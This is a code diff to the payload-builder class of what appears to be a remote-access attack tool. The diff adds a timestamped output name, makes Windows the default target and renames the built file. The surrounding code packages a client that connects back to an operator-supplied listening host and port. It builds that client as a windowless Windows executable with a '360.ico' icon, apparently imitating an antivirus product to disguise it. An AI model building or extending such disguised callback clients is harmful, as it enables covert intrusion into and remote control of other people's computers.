@@ -6,6 +6,7 @@
 
 import os
 import sys
+import time
 sys.path.append("..")
 import subprocess
 from misc.color import Colors
@@ -22,9 +23,11 @@ class GenScript:
 
     def parseArgs(self):
         parser = ArgumentParser(prog=self.keyWord)
+        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
         parser.add_argument("-lh", "--lhost", type=str, required=True, help=f"The listening host")
         parser.add_argument("-lp", "--lport", type=int, required=False, default=1116, help=f"The listening port, default is 1116")
-        parser.add_argument("-a", "--platform", type=str, required=True, choices=["win", "linux"], help=f"The remote platform (win or linux)")
+        parser.add_argument("-a", "--platform", type=str, required=False, choices=["win", "linux"], default="win", help=f"The remote platform (win or linux)")
+        parser.add_argument("-o", "--output", type=str, required=False, default=f"script_{date}.exe", help="Name of the script file, default is script_{date}.exe")
         parser.add_argument("--screenHost", action="store_true", default=False, help=f"open screen host script")
         return parser.parse_args()
 
@@ -49,9 +52,9 @@ class GenScript:
                     os.chdir("./docker-pyinstaller/src")
                     cmd = ["pipreqs ./ --force", "docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows"]
                     subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
-                    print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
+                    print(Colors.GREEN + "[+]" + Colors.END + f" Sucessfully! The File in ./dist/{self.args.output}")
                 else:
-                    print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
+                    print(Colors.GREEN + "[+]" + Colors.END + f" Sucessfully! The File in ./dist/{self.args.output}")
                 for i in range(2):
                     os.chdir(os.path.abspath(os.path.pardir))
             # 当前运行平台是Windows
@@ -59,14 +62,14 @@ class GenScript:
                 if remotePlatform == "win":
                     subprocess.Popen("pyinstaller -Fw -i ./misc/360.ico client_tmp.py", shell=True,
                                      stdout=subprocess.PIPE).wait()
-                    print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
+                    print(Colors.GREEN + "[+]" + Colors.END + f" Sucessfully! The File in ./dist/{self.args.output}")
                 else:
                     if not os.path.exists("./dist/"):
                         os.mkdir("./dist/")
                     subprocess.Popen("copy .\client_tmp.py .\dist\client_tmp.py /Y", shell=True,
                                      stdout=subprocess.PIPE).wait()
                     os.remove("./client_tmp.py")
-                    print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
+                    print(Colors.GREEN + "[+]" + Colors.END + f" Sucessfully! The File in ./dist/{self.args.output}")
             else:
                 print(Colors.YELLOW + "[!]" + Colors.END + " Only Support Windows/Linux.")
             # 删除临时文件和目录
@@ -76,6 +79,7 @@ class GenScript:
             elif "linux" in localPlatform:
                 cmd = ["rm -rf __pycache__", "rm -rf build", "rm client_tmp.py"]
             subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
+            os.rename("./dist/client_tmp.exe", f"./dist/{self.args.output}")
         except:
             print("Something Error. Maybe You Should Check The Operating Environment, Like pipreps、docker、docker-pyinstaller、pyinstaller.")
 
